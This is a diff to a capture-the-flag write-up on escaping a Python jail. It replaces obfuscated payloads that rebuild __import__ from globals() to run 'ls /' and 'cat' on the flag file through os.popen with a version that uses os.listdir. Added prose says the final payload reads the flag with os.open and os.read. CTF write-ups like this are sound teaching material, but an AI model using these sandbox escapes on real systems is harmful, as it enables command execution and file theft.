@@ -18,10 +18,13 @@ nc some.server 1339
 
 ### Solution
 
+To list a directory and get a name of flag file, we use the following `ls` payload: 
 ``` python
-(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").popen("ls /").read())
-(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtins'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").popen("cat /flag????f?c???????ad?b???b?a?ea?f?c??.txt").read())
+(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtin'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtin'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").listdir("/"))
 ```
+
+Then see `payload`. Basically, it's just importing `os`, opening file with `os.open` and reading with `os.read`. 
+`os.system` was banned in this task, as well as `os.popen` and some other classical vectors.
 
 --------------------
 
